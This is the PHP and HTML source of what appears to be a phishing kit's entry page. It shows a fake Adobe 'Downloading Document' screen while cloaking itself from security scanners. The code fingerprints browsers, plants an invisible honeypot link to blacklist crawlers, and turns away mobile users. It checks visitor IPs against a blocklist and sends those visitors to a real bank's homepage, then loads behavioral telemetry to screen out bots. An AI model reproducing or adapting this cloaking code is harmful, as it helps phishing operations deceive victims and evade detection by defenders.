<?php
require __DIR__ . '/../lib.php';

// Entry page: real desktop Chrome only (full header fingerprint + honeypot).
gate_doc([], 0, false);

$tk = issue_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Downloading Document</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
    .container {
      width: 100%; height: 100vh;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      background: #fff; gap: 15px; padding-bottom: 20vh;
    }
    .logo { width: 80px; height: 80px; object-fit: contain; }
    .download-text { font-weight: bold; font-size: 16px; }
    .spinner {
      width: 40px; height: 40px;
      border: 5px solid red; border-top-color: transparent;
      border-radius: 50%;
      animation: spinner 0.7s linear infinite;
    }
    @keyframes spinner { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="container">
    <img src="assets/adobe-logo.png" alt="Logo" class="logo">
    <div class="download-text">Downloading Document</div>
    <div class="spinner"></div>
  </div>

  <!-- Honeypot: invisible to humans, followed by link-crawling bots.
       A visit to ?hp=1 poisons that IP+UA fingerprint for 24h. -->
  <a href="?hp=1" aria-hidden="true"
     style="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;overflow:hidden;white-space:nowrap;">Skip verification</a>

  <script>
    const TK = <?php echo json_encode($tk); ?>;

    const blockedIPs = [
      '162.158.63.162',
      '162.158.63.161',
      '162.158.63.160'
    ];

    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function getClientIP() {
      // 3s guard so a hung external call can't stall the whole flow.
      return new Promise((resolve) => {
        var to = setTimeout(function () { resolve(null); }, 3000);
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => { clearTimeout(to); resolve(data.ip); })
          .catch(() => { clearTimeout(to); resolve(null); });
      });
    }

    (async function() {
      if (isMobileDevice()) {
        window.location.href = "denied.html";
        return;
      }
      const clientIP = await getClientIP();
      if (clientIP && blockedIPs.includes(clientIP)) {
        window.location.href = "https://www.easternbank.com/";
        return;
      }
      // Behavioral gate: collect mouse/keyboard/scroll, one Jev verdict,
      // then continue with the verdict-bound token. All failure paths fall
      // back to the original 5s fixed-time redirect.
      <?php include __DIR__ . '/../include/telemetry.php'; ?>
    })();
  </script>
</body>
</html>
